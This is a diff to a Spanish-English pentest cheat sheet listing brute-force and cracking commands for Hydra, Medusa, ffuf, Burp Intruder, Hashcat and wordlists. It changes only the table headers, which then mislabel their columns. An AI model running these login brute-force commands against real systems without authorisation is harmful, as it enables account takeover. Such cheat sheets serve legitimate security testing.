@@ -25,7 +25,7 @@ linked:
 
 ## Hydra (THC-Hydra)
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | HTTP form POST | `hydra -L u.txt -P p.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | Multi-protocol. |
 | HTTPS form POST | `hydra -L u.txt -P p.txt -s 443 target https-post-form ...` | Same con TLS. |
@@ -70,7 +70,7 @@ ___
 
 ## Burp Suite Intruder + Turbo Intruder
 
-| **Función** | **Acción** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Sniper attack | Single payload position | Standard. |
 | Battering Ram | Same payload all positions | Edge use. |
@@ -114,7 +114,7 @@ ___
 
 ## Medusa, Patator, Ncrack
 
-| **Tool** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Medusa basic | `medusa -h target -U u.txt -P p.txt -M http -m DIR:/admin` | Modular. |
 | Medusa form-based | `medusa -h target -U u.txt -P p.txt -M web-form -m FORM:"login.php" -m DENY-SIGNAL:"Invalid"` | Form support. |
@@ -152,7 +152,7 @@ ___
 
 ## ffuf, wfuzz, gobuster (Fast Fuzzers)
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | ffuf POST body fuzz | `ffuf -u target/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt` | Fast. |
 | ffuf filter status | `-fs 1234` (size) `-fc 401` (code) | Filtering. |
@@ -191,7 +191,7 @@ ___
 
 ## Hashcat / John (Hash Crack)
 
-| **Tool** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Hashcat MD5 | `hashcat -m 0 -a 0 hash.txt rockyou.txt` | GPU. |
 | Hashcat SHA1 | `hashcat -m 100 hash.txt rockyou.txt` | Standard. |
@@ -234,7 +234,7 @@ ___
 
 ## Wordlists & Anti-Captcha
 
-| **Source / Tool** | **Uso** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | RockYou | `/usr/share/wordlists/rockyou.txt` | Default Kali. |
 | SecLists Passwords | `seclists/Passwords/` | Curated. |
